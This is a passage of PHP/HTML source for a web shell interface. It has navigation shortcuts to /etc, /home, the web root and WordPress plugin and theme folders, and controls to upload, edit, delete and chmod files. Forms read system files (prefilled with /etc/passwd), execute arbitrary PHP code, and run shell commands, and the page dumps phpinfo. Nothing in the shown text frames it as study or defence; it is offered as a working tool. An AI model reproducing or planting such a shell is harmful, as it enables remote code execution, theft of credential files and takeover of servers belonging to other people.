    
    <!-- Quick Access Buttons -->
    <div class="section" style="background:#e8f5e9">
        <strong>⚡ Quick Access:</strong>
        <a href="?dir=<?php echo urlencode(getcwd()); ?>">🏠 Current</a> |
        <a href="?dir=/">💻 System Root</a> |
        <a href="?dir=/var/www/html">🌐 Web Root</a> |
        <a href="?dir=/etc">⚙️ /etc</a> |
        <a href="?dir=/home">👤 /home</a> |
        <a href="?dir=/tmp">📦 /tmp</a>
        <?php if ($isWordPress): ?>
            | <a href="?dir=<?php echo urlencode($wpRoot); ?>">🎯 WordPress Root</a>
            | <a href="?dir=<?php echo urlencode($wpPluginsPath); ?>">🔌 Plugins</a>
            | <a href="?dir=<?php echo urlencode($wpThemesPath); ?>">🎨 Themes</a>
        <?php endif; ?>
    </div>
    
    <!-- Upload Form (Current Directory) -->
    <div class="section">
        <form method="POST" enctype="multipart/form-data">
            <strong>📤 Upload to Current Directory:</strong>
            <input type="file" name="file" required>
            <input type="submit" value="Upload">
        </form>
    </div>
    
    <!-- Create Form (Current Directory) -->
    <div class="section">
        <form method="POST">
            <strong>➕ Create in Current Directory:</strong>
            <input type="text" name="new_name" placeholder="name" required size="30">
            <select name="item_type">
                <option value="file">📄 File</option>
                <option value="dir">📁 Directory</option>
            </select>
            <input type="submit" name="create_item" value="Create">
        </form>
    </div>
    
    <!-- System Tools -->
    <div class="section" style="background:#fff3e0">
        <details>
            <summary><strong>🔧 Advanced Tools (Code Execution & System Commands)</strong></summary>
            <br>
            
            <form method="POST" style="margin-bottom:15px">
                <strong>📖 Read System File:</strong>
                <input type="text" name="system_file" value="/etc/passwd" size="50">
                <input type="submit" name="read_system" value="Read File">
            </form>
            
            <form method="POST" style="margin-bottom:15px">
                <strong>🐘 Execute PHP Code:</strong><br>
                <textarea name="execute_code" rows="3" cols="80" placeholder='echo system("whoami");&#10;echo file_get_contents("/etc/passwd");&#10;phpinfo();'></textarea><br>
                <input type="submit" value="Run PHP Code">
            </form>
            
            <form method="POST">
                <strong>💻 System Command:</strong>
                <input type="text" name="system_cmd" size="60" placeholder="ls -la, whoami, id, pwd, uname -a">
                <input type="submit" value="Execute Command">
            </form>
        </details>
    </div>
    
    <!-- File Listing -->
    <h3>📂 Directory Contents:</h3>
    <table class="file-table">
        <thead>
            <tr>
                <th>Type</th><th>Name</th><th>Permissions</th><th>Size</th><th colspan="5">Actions</th>
            </tr>
        </thead>
        <tbody>
        <?php
        $files = scandir($dir);
        foreach ($files as $f) {
            if ($f === '.' || $f === '..') continue;
            $path = $dir . '/' . $f;
            $isDir = is_dir($path);
            $icon = $isDir ? "📁" : "📄";
            $perms = substr(sprintf('%o', fileperms($path)), -4);
            $size = $isDir ? '-' : round(filesize($path)/1024, 2) . ' KB';
            ?>
            <tr>
                <td><?php echo $icon; ?></td>
                <td>
                    <?php if ($isDir): ?>
                        <a href="?dir=<?php echo urlencode($path); ?>" class="dir-link"><?php echo htmlspecialchars($f); ?></a>/
                    <?php else: ?>
                        <?php echo htmlspecialchars($f); ?>
                    <?php endif; ?>
                </td>
                <td style="font-family:monospace; font-size:11px"><?php echo $perms; ?></td>
                <td style="font-size:12px"><?php echo $size; ?></td>
                <td class="actions">
                    <?php if (!$isDir): ?>
                        <a href="?edit=<?php echo urlencode($path); ?>&dir=<?php echo urlencode($dir); ?>">✏️ Edit</a>
                        <a href="?download=<?php echo urlencode($path); ?>">⬇️ Download</a>
                        <a href="?view=<?php echo urlencode($path); ?>&dir=<?php echo urlencode($dir); ?>">👁️ View</a>
                    <?php endif; ?>
                    
                    <form method="GET" style="display:inline">
                        <input type="hidden" name="rename" value="<?php echo htmlspecialchars($path); ?>">
                        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
                        <input type="text" name="newname" placeholder="new name" size="10">
                        <button type="submit">Rename</button>
                    </form>
                    
                    <ahref="?delete=<?php echo urlencode($path); ?>&dir=<?php echo urlencode($dir); ?>" 
                       class="delete-btn" 
                       onclick="return confirm('⚠️ Delete <?php echo htmlspecialchars($f); ?> permanently?')">🗑️ Delete</a>
                    
                    <form method="GET" style="display:inline">
                        <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($path); ?>">
                        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
                        <input type="text" name="perms" placeholder="0755" size="5">
                        <button type="submit">Chmod</button>
                    </form>
                </td>
            </tr>
            <?php
        }
        ?>
        </tbody>
    </table>
    
    <!-- PHP Info Link -->
    <hr>
    <a href="?phpinfo=1" target="_blank">🔧 System Information (phpinfo)</a>
    <?php if (isset($_GET['phpinfo'])) phpinfo(); ?>
</div>
</body>
</html>
